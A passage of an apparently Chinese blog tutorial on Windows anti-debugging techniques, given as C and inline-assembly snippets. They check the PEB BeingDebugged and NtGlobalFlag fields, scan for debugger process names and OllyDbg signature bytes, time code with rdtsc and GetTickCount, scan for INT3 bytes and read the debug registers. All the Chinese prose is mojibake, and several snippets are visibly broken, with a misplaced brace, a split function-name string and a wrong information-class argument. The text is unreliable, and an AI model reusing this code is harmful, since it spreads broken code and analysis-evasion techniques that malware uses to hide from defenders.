class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseHandle((HANDLE)<span class="number">0x1234</span>);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span> || GetLastError() != ERROR_INVALID_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseWindow((HWND)<span class="number">0x1234</span>);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span> || GetLastError() != ERROR_INVALID_WINDOW_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ£€æµ‹"><a href="#æ•°æ®æ£€æµ‹" class="headerlink" title="æ•°æ®æ£€æµ‹"></a><strong>æ•°æ®æ£€æµ‹</strong></h3><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a><strong>BeingDebugged</strong></h4><p>æ•°æ®æ£€æµ‹æ˜¯æŒ‡ç¨‹åºé€šè¿‡æµ‹è¯•ä¸€äº›ä¸è°ƒè¯•ç›¸å…³çš„å…³é”®ä½ç½®çš„æ•°æ®æ¥åˆ¤æ–­æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ã€‚æ¯”å¦‚ PEB ä¸­çš„ BeingDebugged å‚æ•°ã€‚æ•°æ®æ£€æµ‹å°±æ˜¯ç›´æ¥å®šä½åˆ°è¿™äº›æ•°æ®åœ°å€å¹¶æµ‹è¯•å…¶ä¸­çš„æ•°æ®ï¼Œä»è€Œé¿å…è°ƒç”¨å‡½æ•°ï¼Œä½¿ç¨‹åºçš„è¡Œä¸ºæ›´åŠ éšè”½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> BeingDebug = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h] ; æŒ‡å‘ PEB åŸºåœ°å€</span><br><span class="line">movzx eax, byte ptr [eax+<span class="number">2</span>]</span><br><span class="line">mov BeingDebug, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> BeingDebug != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fs:[30h]</strong></p><h4 id="NTGlobalFlag"><a href="#NTGlobalFlag" class="headerlink" title="NTGlobalFlag"></a><strong>NTGlobalFlag</strong></h4><p>ç”±äºè°ƒè¯•å™¨ä¸­å¯åŠ¨çš„è¿›ç¨‹ä¸æ­£å¸¸å¯åŠ¨çš„è¿›ç¨‹åˆ›å»ºå †çš„æ–¹å¼æœ‰äº›ä¸åŒï¼Œç³»ç»Ÿä½¿ç”¨ PEB ç»“æ„åç§»é‡ 0x68 å¤„çš„ä¸€ä¸ªæœªå…¬å¼€çš„ä½ç½® NTGlobalFlag ï¼Œæ¥å†³å®šå¦‚ä½•åˆ›å»ºå †ç»“æ„ã€‚å¦‚æœè¿™ä¸ªä½ç½®ä¸Šçš„å€¼ä¸º 0x70 ï¼Œåˆ™è¿›ç¨‹å¤„äºè°ƒè¯•å™¨ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> BeingDbg = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]</span><br><span class="line">mov eax, dword ptr [eax + <span class="number">68</span>h]</span><br><span class="line">and eax, <span class="number">0x70</span></span><br><span class="line">mov BeingDbg, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> BeingDbg != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿›ç¨‹æ£€æµ‹"><a href="#è¿›ç¨‹æ£€æµ‹" class="headerlink" title="è¿›ç¨‹æ£€æµ‹"></a><strong>è¿›ç¨‹æ£€æµ‹</strong></h3><p>è¿›ç¨‹æ£€æµ‹é€šè¿‡æ£€æµ‹å½“å‰æ¡Œé¢ä¸­æ˜¯å¦å­˜åœ¨ç‰¹å®šçš„è°ƒè¯•è¿›ç¨‹æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è°ƒè¯•å™¨ï¼Œä½†ä¸èƒ½åˆ¤æ–­è¯¥è°ƒè¯•å™¨æ˜¯å¦æ­£åœ¨è°ƒè¯•è¯¥ç¨‹åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (FindWindowA(<span class="string">&quot;x32dbg&quot;</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD ID;</span><br><span class="line">    DWORD ret = <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bMore = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (bMore)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (stricmp(pe32.szExeFile, <span class="string">&quot;OllyDBG.EXE&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;OllyICE.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;x64_dbg.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;windbg.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;ImmunityDebugger.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        bMore = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‰¹å¾ç æ£€æµ‹"><a href="#ç‰¹å¾ç æ£€æµ‹" class="headerlink" title="ç‰¹å¾ç æ£€æµ‹"></a><strong>ç‰¹å¾ç æ£€æµ‹</strong></h3><p>ç‰¹å¾ç æ£€æµ‹æšä¸¾å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶åœ¨è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­æœç´¢ç‰¹å®šè°ƒè¯•å™¨çš„ä»£ç ç‰‡æ®µã€‚</p><p>ä¾‹å¦‚ OllyDbg æœ‰è¿™æ ·ä¸€æ®µç‰¹å¾ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00,</span><br><span class="line">0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00,</span><br><span class="line">0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00,</span><br><span class="line">0x4b, 0x00, 0x00, 0x00</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;BYTE sign[] = &#123; <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x6f</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x4f</span>, <span class="number">0x00</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x79</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4f</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x4b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>; &#125;</span><br><span class="line">    PROCESSENTRY32 sentry32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    sentry32.dwSize = <span class="keyword">sizeof</span>(sentry32);</span><br><span class="line">    HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    Process32First(phsnap, &amp;sentry32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE,</span><br><span class="line">            sentry32.th32ProcessID);</span><br><span class="line">        <span class="keyword">if</span> (hps != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD szReaded = <span class="number">0</span>;</span><br><span class="line">            BYTE signRemote[<span class="keyword">sizeof</span>(sign)];</span><br><span class="line">            ReadProcessMemory(hps, (LPCVOID)<span class="number">0x4f632a</span>, signRemote,</span><br><span class="line">                <span class="keyword">sizeof</span>(signRemote), &amp;szReaded);</span><br><span class="line">            <span class="keyword">if</span> (szReaded &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">memcmp</span>(sign, signRemote, <span class="keyword">sizeof</span>(sign)) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    CloseHandle(phsnap);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sentry32.dwSize = <span class="keyword">sizeof</span>(sentry32);</span><br><span class="line">&#125;<span class="keyword">while</span> (Process32Next(phsnap, &amp;sentry32));</span><br></pre></td></tr></table></figure><h3 id="æ—¶é—´æ£€æµ‹"><a href="#æ—¶é—´æ£€æµ‹" class="headerlink" title="æ—¶é—´æ£€æµ‹"></a><strong>æ—¶é—´æ£€æµ‹</strong></h3><p>æ—¶é—´æ£€æµ‹æ˜¯æŒ‡åœ¨ç¨‹åºä¸­é€šè¿‡ä»£ç æ„ŸçŸ¥ç¨‹åºå¤„äºè°ƒè¯•æ—¶ä¸æœªå¤„äºè°ƒè¯•æ—¶çš„å„ç§è¿è¡Œæ—¶é—´å·®å¼‚æ¥åˆ¤æ–­ç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬åœ¨è°ƒè¯•æ—¶æ­¥è¿‡ä¸¤æ¡æŒ‡ä»¤æ‰€èŠ±è´¹çš„æ—¶é—´è¿œè¿œè¶…è¿‡ CPU æ­£å¸¸æ‰§è¡ŒèŠ±è´¹çš„æ—¶é—´ï¼Œäºæ˜¯å°±å¯ä»¥é€šè¿‡rdtsc æŒ‡ä»¤æˆ– GetTickCount å‡½æ•°æ¥è¿›è¡Œæµ‹è¯•ã€‚</p><p>æ³¨ï¼š rdtsc æŒ‡ä»¤ç”¨äºå°†æ—¶é—´æ ‡ç­¾è®¡æ•°å™¨è¯»å…¥ EDX:EAX å¯„å­˜å™¨ã€‚ GetTickCount è¿”å›ä»æ“ä½œç³»ç»ŸåŠ¨</p><p>æ‰€ç»è¿‡çš„æ¯«ç§’æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> BeingDbg = <span class="number">0</span>;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        rdtsc</span><br><span class="line">        mov ecx, edx</span><br><span class="line">        rdtsc</span><br><span class="line">        sub edx, ecx</span><br><span class="line">        mov BeingDbg, edx</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (BeingDbg &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD time1 = GetTickCount();</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov ecx, <span class="number">10</span></span><br><span class="line">        mov edx, <span class="number">6</span></span><br><span class="line">        mov ecx, <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD time2 = GetTickCount();</span><br><span class="line">    <span class="keyword">if</span> (time2 - time1 &gt; <span class="number">0x1A</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–­ç‚¹æ£€æµ‹"><a href="#æ–­ç‚¹æ£€æµ‹" class="headerlink" title="æ–­ç‚¹æ£€æµ‹"></a><strong>æ–­ç‚¹æ£€æµ‹</strong></h3><p>æ–­ç‚¹æ£€æµ‹æ˜¯æ ¹æ®è°ƒè¯•å™¨è®¾ç½®æ–­ç‚¹çš„åŸç†æ¥æ£€æµ‹è½¯ä»¶ä»£ç ä¸­æ˜¯å¦è®¾ç½®äº†æ–­ç‚¹ã€‚è°ƒè¯•å™¨ä¸€èˆ¬ä½¿ç”¨ä¸¤è€…æ–¹æ³•è®¾ç½®ä»£ç æ–­ç‚¹ï¼š</p><ul><li><p>é€šè¿‡ä¿®æ”¹ä»£ç æŒ‡ä»¤ä¸º INT3ï¼ˆæœºå™¨ç ä¸º0xCCï¼‰è§¦å‘è½¯ä»¶å¼‚å¸¸</p></li><li><p>é€šè¿‡ç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨è®¾ç½®ç¡¬ä»¶æ–­ç‚¹</p></li></ul><p>é’ˆå¯¹è½¯ä»¶æ–­ç‚¹ï¼Œæ£€æµ‹ç³»ç»Ÿä¼šæ‰«ææ¯”è¾ƒé‡è¦çš„ä»£ç åŒºåŸŸï¼Œçœ‹æ˜¯å¦å­˜åœ¨å¤šä½™çš„ INT3 æŒ‡ä»¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS32 pNtHeaders;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line">DWORD dwBaseImage = (DWORD)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;</span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader -</span><br><span class="line">&gt; e_lfanew);</span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders +</span><br><span class="line"><span class="keyword">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER) +</span><br><span class="line">(WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;</span><br><span class="line">DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">BOOL Found = FALSE;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">cld</span><br><span class="line">mov edi, dwAddr</span><br><span class="line">mov ecx, dwCodeSize</span><br><span class="line">mov al, <span class="number">0</span>CCH</span><br><span class="line">repne scasb; åœ¨EDIæŒ‡å‘å¤§å°ä¸ºECXçš„ç¼“å†²åŒºä¸­æœç´¢ALåŒ…å«çš„å­—èŠ‚</span><br><span class="line">jnz NotFound</span><br><span class="line">mov Found, <span class="number">1</span></span><br><span class="line">NotFound:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œå¯¹äºç¡¬ä»¶æ–­ç‚¹ï¼Œç”±äºç¨‹åºå·¥ä½œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ— æ³•è®¿é—®ç¡¬ä»¶è°ƒè¯•æ–­ç‚¹ï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦æ„å»ºå¼‚å¸¸ç¨‹åºæ¥è·å– DR å¯„å­˜å™¨çš„å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">CONTEXT context;</span><br><span class="line">HANDLE hThread = GetCurrentThread();</span><br><span class="line">context.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">GetThreadContext(hThread, &amp;context);</span><br><span class="line"><span class="keyword">if</span> (context.Dr0 != <span class="number">0</span> || context.Dr1 != <span class="number">0</span> || context.Dr2 != <span class="number">0</span> ||</span><br><span class="line">context.Dr3 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–æ£€æµ‹"><a href="#å…¶ä»–æ£€æµ‹" class="headerlink" title="å…¶ä»–æ£€æµ‹"></a><strong>å…¶ä»–æ£€æµ‹</strong></h3><h4 id="åˆ¤æ–­çˆ¶è¿›ç¨‹æ˜¯å¦ä¸º-explorer-exe"><a href="#åˆ¤æ–­çˆ¶è¿›ç¨‹æ˜¯å¦ä¸º-explorer-exe" class="headerlink" title="åˆ¤æ–­çˆ¶è¿›ç¨‹æ˜¯å¦ä¸º explorer.exe"></a><strong>åˆ¤æ–­çˆ¶è¿›ç¨‹æ˜¯å¦ä¸º</strong> <strong>explorer.exe</strong></h4><p>ä¸€èˆ¬åŒå‡»è¿è¡Œçš„è¿›ç¨‹çš„çˆ¶è¿›ç¨‹éƒ½æ˜¯ explorer.exeï¼Œä½†æ˜¯å¦‚æœè¿›ç¨‹è¢«è°ƒè¯•çˆ¶è¿›ç¨‹åˆ™æ˜¯è°ƒè¯•å™¨è¿›ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœçˆ¶è¿›ç¨‹ä¸æ˜¯ explorer.exe åˆ™å¯ä»¥è®¤ä¸ºç¨‹åºæ­£åœ¨è¢«è°ƒè¯•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LONG status;</span><br><span class="line">    DWORD dwParentPID = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    PROCESS_BASIC_INFORMATION pbi;</span><br><span class="line">    <span class="type">int</span> pid = getpid();</span><br><span class="line">    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess =</span><br><span class="line">        (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtQueryInf</span></span><br><span class="line"><span class="string">            ormationProcess&quot;</span>);</span><br><span class="line">            status = NtQueryInformationProcess(hProcess, SystemBasicInformation,</span><br><span class="line">                (PVOID)&amp;pbi, <span class="keyword">sizeof</span>(PROCESS_BASIC_INFORMATION), <span class="literal">NULL</span>);</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bMore = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (bMore)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pbi.InheritedFromUniqueProcessId == pe32.th32ProcessID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stricmp(pe32.szExeFile, <span class="string">&quot;explorer.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                CloseHandle(hProcessSnap);</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                CloseHandle(hProcessSnap);</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bMore = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æµ‹è¯•-STARTUPINFO"><a href="#æµ‹è¯•-STARTUPINFO" class="headerlink" title="æµ‹è¯• STARTUPINFO"></a><strong>æµ‹è¯•</strong> <strong>STARTUPINFO</strong></h4><p>åœ¨ä½¿ç”¨ CreateProcess åˆ›å»ºè¿›ç¨‹æ—¶,éœ€è¦ä¼ é€’ STARTUPINFO çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œå¸¸å¸¸æˆ‘ä»¬å¹¶ä¸ä¼šä¸€ä¸ªä¸€ä¸ªè®¾ç½®å…¶ç»“æ„çš„å€¼ï¼Œè¿æŠŠå…¶ä»–ä¸ç”¨çš„å€¼æ¸… 0 éƒ½ä¼šå¿½ç•¥ã€‚</p><p>æ•…å¯ä»¥ä½¿ç”¨ GetStartupInfo æ£€æŸ¥å¯åŠ¨ä¿¡æ¯ï¼Œå¦‚æœå¾ˆå¤šå€¼ä¸ä¸º 0ï¼Œé‚£ä¹ˆå°±è¯´æ˜è‡ªå·±çš„çˆ¶è¿›ç¨‹ä¸æ˜¯explorerï¼ˆexplorer.exe ä½¿ç”¨ shell32 ä¸­ ShellExecute æ¥è¿è¡Œç¨‹åºï¼Œ ShellExecute ä¼šæ¸…æ‰ä¸ç”¨çš„å€¼ï¼‰</p><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨ STARTUPINFO 